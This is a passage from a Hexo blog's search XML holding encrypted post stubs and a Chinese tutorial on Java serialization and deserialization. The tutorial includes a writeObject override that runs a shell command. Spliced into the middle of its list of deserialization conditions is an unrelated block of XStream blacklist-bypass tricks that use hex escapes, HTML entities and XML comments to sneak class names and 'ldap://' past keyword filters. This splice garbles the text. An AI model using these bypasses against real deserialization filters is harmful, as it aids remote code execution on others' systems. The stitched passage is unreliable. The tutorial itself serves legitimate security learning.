835015e133aef450812bfc08d180fef1fbda5758b1ed3e4e32e605af139fe14365e0464751e7f2aa9cea995638e75c096e605ac0187ac60eeca1796f0d2a2c43d231d395a598d965b2c80e8d9c5083b95e27ec2c326da83ea440dd5ab6bf712e520ddb0daa8ff0a21c858a98834ec9bf7795872495dea3cc6e3182f9a4a691732ba827f0a71055757591dd88607c321c613f40cb19da5691e58464dd28c1455a1bf27bcaf1b5c76f9991921696bed87ab58cf9bac0983686e31a66f609ebb5e1530e39df2a44d08a9a4f220557f5c82f62441e07ffde695674d68ff51224f73dfe295f192c16adb70d2213f468ad67b3f1ab8030206b708e133380c8a37aeaf9c3070aeeddd319829eed54f63b36742a91de3e51b495cb3b6c0af3eb538023f7de271fad4db9593000986ef310e1bd746c0200812bf874e84ced2147aea8ba24bc14f68a3f0bbfddeee763aa9eab7079af6543f3cf350d36aca745f55313eb072b989103d116507f258ec079a38396e2e8260b08798253bbd39b69da8122cb470814b624dbd2ed5cf10cfe5bb57cb011cdd1986a6fcb8098fa58eb46542e65bd6558a337502910651d9fc855788500227e969e195f995b09ec0be58e44dc90b77918ec7aaab7ccc1e704f9a30807531c101dff5e1c46fc2277b00a0e3099796b9c7d7987c42ab574445b7b18e4f99b99974b7d8b99737968ac762ede15944d782b08119cdd1824fe4261c34a9903ceced5f4804e975701ed881b11d24bfc8cf6feabe79b2a3d454c3cf2fa92226ff7297eea1d47c92102aa5da23f187f4e760eb7337a22a14bce6d74e632062b50ed3b335b1397aba9f421078b57178bac4e8f658193a1931e28881ce053400dc1b83a4aab3a4fbcd960628aafff1539feff32f3279e383d65c24def2da79dfddd1ee127393aa2ed2c0f2527356164bdc35b54c63b972599134f2d5321b9bcc33709a547e6e542f58bb56dab71e00ebc30aba7b9a79ed6aa50351519ea94cfde707034137eb76ca0bfa8d102a1faded7d5766d6fbc330346006d671cb97c79250d3f44caa805d7606e617b9755e23e03a43b5882696f1767087f9cda939ba9dd691f280a744967fe66e63c27cf5661d458c38dd8b799484926fa9ad98ee3a5302ec8ae5aa5fd0481d57a0ad2ea47bb678dae8fedc38b266d811bd2bdf54ba919dadb7620ea76eac0d642cf1e246691d80adeb352e086c9abd56138ccdb2628f902d62200cd445bd90a9fd1e47c68e0eb327f1dcb26501bc34d367dfbb5269e0ebdf690448765da09ea885d3aacb8bc228554e5c4dd59073777760431c213a1970de5ff326037eef625ac0a4cf56202d5417dd50b3349a78e539e2091b83859950999f41027a3a32f81e71f2a9fcfd9a5f0378cb4a52d0602dd7597c50305d9948bdf200e0744f56c7bb1157ed4b98286dc600c90259735ed21e83515f3da64476e1044251813362ed9451eb55a85e24776620d375850d8e064244843f9b440fe0a8686b2e7f92a46d36dbde500268cb83eb311c74f1e63f74cf933161d42a382179faa14d923dfa8471cb2b39e2b3b6603b04e1f584537ce0d53fd0c324d5dee833ad2d69c886d63b60bbc1b67501bfbf4452c8b7e91bce7431085bda4332b24f4c29d9a71e148005da2e554d325fbe71341c7e0a28641bd480d4a3687a9ac7d173ddb787aceb19042b2d898afc24a5d81aa8efefb6dbab777aa85c93245dca62e9f62fef44a7627f0c07cd35c5785455a5ca82a184f62438f94cd7e3783f65965ec8094422cb27b77a42ecd5b327033ede045fc616ce08a91f329e48da605dc44e6d1195b2297684e66cfe8b4ca81c4629c7ac4393c5875f67dc1142953d481b7304df485a92bc3e807ba1a45250c1e0c2841d22fbc312c8efbd0492a2043f4da5764096259946a3efb281a1ca5fbb77ee4b8e350d8ec0e5372bddcf9b70518782134e40259f7c3237c320f56d2639589d784687abb16334d752e34b229a606938071a630a93ce0cd23d4d92330f7837b6cbcf57eed16b667f43861b645bb02e33c22caded032ac1fb9a668c524656a896386d7f3afdedafd06ab1410eb1d84703a1085fc497061d36128ba026130a30bd0af9fa46e5828408c5c2b0d141ddfc690c12183892dfa3f48bf502ed679866450f7da0cbda8d6f6816f6bb733b1c29a8aeaae8d6c807a8a7e469a6dd87c870aa120b1f120807a3ead15eeb235c20fd9d50d72e63ae4b9ff9c7c78bdd097bd6c488c15a78bd99fb26edc059c1e9d490a88e8cf7950929638cec4e7f4d5cdbd7dc6a1fe33b9c3b031a3fc870fdabed5aecce8f9dbfe446b422960022dc49e9c009017ecb1c4cb8309873a4f0f050a5ec539a152aa3b2ea711b9d5a100e9dc4df2dc6bd0abb7ff89d68e0701f53fc1b6ef1c7c7d64aedd2f09e08001bc184b12272b73829227f87217bdedcf679c5c3f1f6f51b452a0e4c90a442ef1002fabaeff5c0b147945bdc5ed3857ecb2ee305cae46ac4a01d92488b8734d713efd26e009046febbc8f7787d9fdce48e38e28d2ba2c6253de5092b67389ae22ad0083cd3e37ee78d0926966e86a071ff6657dcd2f2ea72b41dc88b45757f09c79f10cc7468d40caaf4c4fe99da1790acfbfa6748176cee888072e7737c2a96c0e54742e687082028607ab6b68dc0f0be7b517daa97029c75b58d452676cfe1bf7bc0214c61a844f19214a9d61b622b72ff9e631ff014fffeb5ff3591e95780bb12b06f49648aaaabf73f24941821cd3912e76c047e5b72b8182a1226f9485a16f464719277588ff17e4d5c7823d33afd05d1e76b1999b63b10f8ea3501352580abed5c74530d45fdba489d3ed176da0c4d91ac08a676be7e4293c247c4a607354f37f1f98e1db8f474ab549014995a730d47f5a76e398a89e1c54809776406be31e9daeb957941b92d8086b3f0813c7c5c29a4420e8a9d9a813ddeaf3b44436f136aff3d3428349e4034047c18c1bd01e9a7fad3a21092afdda4b987cce9e30345d51929a3eea954c1b74320462fc7c4929d9ecb5eac8ac257c766cf95934a3d2d292eda8e6793fd7cc25a650e1a7de9e31deda5eb2892dcbf4caa2f05f5fdbe291aa01bd36b2bb65bc3f7276dcc42d7aab9b541b0f4af9b1fa393e9c743f564b3011aeb16fbc1bb32eb90b165148004fb2a8f8e230262a3d1aa50022f135a080f8b06e55f67b80181498655b2b6ee3bc1f73983b47f75d95965652853a224c3295e0aaeceebed6118fee9c638970565977f844d88103d17a957518dad0f1f748a28e65866a67b6849e0a8de296e8ab12dc27dad3c394ef327625e60ed54b7d70eb331a859adc38f915e94577d288856bb9963f3855923eb53a8969dd1d2d530c9935278bf7faab0e5ede6609f4a58a2b8f8a55ed1a2b91b5190192f87df47897b28b1eb15e6bb7f21d0cb498563d250b55d9cd86840cdfb02db0f228fbb83736b9ef565cf595d3568f0ef9bfda7bf0583ca07076062fc16d98fbc8ef9dc35662edb5748ef6bb951d676e9f5c74193113060132cb735b10899b269ab5e235ba99eb37bcb371ef3be7841e1d456a00490d068c6e62a6f4f1e1871f38c0f7fec6bac6a472749f56915a7c927c4f0b04c9b87674c45533f8208b6bf8c02ea3d51e19b9cac2d6263301a2f8eca11a41ed1b5248ab16254dd8ddc5b11ec2b1592b6693180557a62b07ee7fac142112f8f1eb3031e871fc3ea4a7b8aabc0ab365a9e7912152cfec53da341066e81b03119bc030fad0c57c121426cf81c4e6206c585f5def07d0c55574e9f23670e5ceffc4823f81aa2dad03ce446d68f1a21775c5e77ddc6fc94ee589c2c58f0ef2bd5f29b93264a147fd3d34bbe3060bfc1e2a8bf040f6968eabbe314bda74eb59f85d1e6a63b3c18bf02bfbe06d5047830d229454a1cb5c8fbb86b36ec68dfc17230458a1be56132afe22bbbdfdde902b84c8d1b3f083927dca72b699c93df7c5dc43ac5a2425f8eda9eea7275d151d673b84c00109c42c75e379a321e6a41eb8c6a1b4061c89de514230ea6121563401e0577754fb583f1b7fc7e037df1bc30a05425e0628e1b492dcfcb110dc927dd5d784c8dd75dda4fba59f688dd0394991fd564aa89b79a6f4449d4b3119b16f1a96a404352f1eee51b548e7a2f8200435c679745e95057d5e72e50b947a270a02e5bcc28ee84150a63f571c624a0d84c2a903cf014fdadfaa028d2587db98b1458f6c38475bb0f25ac16a158f809561b86fb0a43be401f9d3c1a38c6f156799501f11f7f9b17b9544b097bd28859728fe3d909c46b4522ac132219af2b1c5976d3bfa938800c973aa53780de9a7dcfa795a11b0ff675d55840fa5b0846b17c29aeb6408c82e9486d86186ff9bb7c13474ba38d5d367b19fde63c9b1d9e5597e8d5953b574eaf900dcc8fc9a5b0195a2df8118e8d40f442aa114fbcb74a168dbe8e96e9b24a7c8eebf3457cc53ed5629bcc1799327a7a46cf2ad0d0e00a5a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">旅行者，这里需要密码才可以访问哦！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c语言能实现agent_!</title>
      <link href="/2021/10/10/c%E8%AF%AD%E8%A8%80%E8%83%BD%E5%AE%9E%E7%8E%B0agent_!/"/>
      <url>/2021/10/10/c%E8%AF%AD%E8%A8%80%E8%83%BD%E5%AE%9E%E7%8E%B0agent_!/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6a95cb890ff08166bf6516c96bdb9f7dd7cefa59015a3a2ae697ebdbd75ac4f4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> c语言 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化</title>
      <link href="/2021/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript">  SAONotify("secret","旅行者，告诉你个秘密，其实，小青是个......");  </script><h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java对象序列化指的是：将一个Java类实例序列化成字节数组，用于存储对象实例化信息：类成员变量和属性值。 </p><p>Java反序列化可指的是：将序列化后的二进制数组转换为对应的Java类实例。</p><p>Java序列化对象因其可以方便的将对象转换成字节数组，又可以方便快速的将字节数组反序列化成Java对象而被非常频繁的被用于<code>Socket</code>传输。</p><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>在 Java 中，通过<code>java.io.Serializable(内部序列化)</code>或者<code>java.io.Externalizable(外部序列化)</code>接口即可实现序列化，其中的<code>java.io.Externalizable</code>接口只是实现了<code>java.io.Serializable</code>接口。</p><p>序列化类对象时必须满足以下条件：</p><ul><li>该类必须实现<code>java.io.Serializable</code>接口。</li><li>该类的所有属性必须是可序列化的(用transient关键字修饰的属性除外，不参与序列化过程)，如果有某个属性不可序列化，则需要注明该属性是短暂的。</li></ul><p>xxxxxxxxxx 1. 16进制绕过​<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;当前黑名单为org[.]springframework，此时的绕过方法可以为<org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor>&lt;/org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;​2. 针对标签属性内容的绕过​<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization="custom">&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;此时的黑名单为custom，那么绕过方法可以为​<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization="cust&#111;m">&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;原理为读取属性内容时，会做符合要求的转化​3. 针对标签内容的绕过<test>ldap://xxxxx</test>此时的黑名单为ldap://，可以用如下的几种方法绕过​html编码:这部分在提取数据时，同样对html编码的内容做了转化<test>&#108;dap://xxxxx</test>​注释的方法:在处理实际的标签内容时，遇到注视内容将被忽略掉<test>ld<!-- test -->ap://xxxxx</test>​​xml</org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor></org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor></org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor></org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor></p><ul><li>被反序列化的类必须存在。</li><li><code>serialVersionUID</code>必须一致。</li></ul><p>此外，<strong>反序列化类对象不会调用该类的构造方法</strong>。因为在反序列化创建类实例的时候使用了<code>sun.reflect.ReflectionFactory.newConstructorForSerialization</code>创建了一个反序列化专用的<code>Constructor(反射构造方法对象)</code>，这个特殊的<code>Constructor</code>可以绕过构造方法去创建类实例。</p><p>编写<code>User</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>使用反序列化创建<code>User</code>类实例<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionFactoryTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 获取sun.reflect.ReflectionFactory对象</span></span><br><span class="line">            <span class="type">ReflectionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> ReflectionFactory.getReflectionFactory();</span><br><span class="line">            <span class="comment">// 使用反序列化获取User类的构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> factory.newConstructorForSerialization(</span><br><span class="line">                    User.class, Object.class.getConstructor()</span><br><span class="line">            );</span><br><span class="line">            System.out.println(constructor.newInstance());</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220829150934435.png" alt="image-20220829150934435"></p><h3 id="核心方法"><a href="#核心方法" class="headerlink" title="核心方法"></a>核心方法</h3><p><code>java.io.ObjectOutputStream</code>类最核心的方法是<code>writeObject</code>方法，即序列化类对象。</p><p><code>java.io.ObjectInputStream</code>类最核心的功能是<code>readObject</code>方法，即反序列化对象。</p><p>通过<code>ObjectInputStream</code>和<code>ObjectOutputStream</code>类我们就可以实现类的序列化和反序列化功能。</p><p><strong>对象序列化步骤如下：</strong></p><ol><li>创建对象输出流</li><li>通过输出流的<code>writeObject()</code>方法将对象进行序列化</li></ol><p><strong>对象反序列化步骤如下：</strong></p><ol><li>创建一个对象输入流</li><li>通过输入流的<code>readObject()</code>方法将字节序列反序列化为对象</li></ol><p><strong>代码示例：</strong></p><p>创建<code>User</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建<code>Main</code>主类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 15:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        m.serialize();</span><br><span class="line">        m.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过writeObject方法将类对象进行序列化</span></span><br><span class="line">        out.writeObject(user);</span><br><span class="line">        System.out.println(<span class="string">&quot;serialize success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) in.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialize success!&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;The name is：&quot;</span>+user.getName());</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220829154016718.png" alt="image-20220829154016718"></p><p><code>java.io.Serializable</code>是一个空的接口，实现该接口的作用是用于<strong>标识该类可序列化</strong>。实现了<code>java.io.Serializable</code>接口的类原则上都需要产生一个<code>serialVersionUID</code>常量，反序列化时如果双方的<code>serialVersionUID</code>不一致会导致<code>InvalidClassException</code>异常。如果可序列化类未显示声明<code>serialVersionUID</code>，则序列化运行时将基于该类的各个方面计算默认<code>serialVersionUID</code>值。</p><p><code>ObjectOutputStream</code>序列化类对象的主要流程是首先判断序列化的类是否重写了<code>writeObject</code>方法，如果重写了就调用序列化对象自身的<code>writeObject</code>方法序列化。<code>ObjectInputStream</code>也是同理</p><p><strong>代码示例：</strong></p><p>创建<code>User</code>类并重写<code>writeObject</code>方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 先调用默认的writeObject方法</span></span><br><span class="line">        out.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 以下为重写命令执行内容</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byte_arr_out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取命令执行结果流</span></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b))!= -<span class="number">1</span>)&#123;</span><br><span class="line">            byte_arr_out.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//打印命令执行结果</span></span><br><span class="line">        System.out.println(byte_arr_out.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建<code>main</code>主类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span 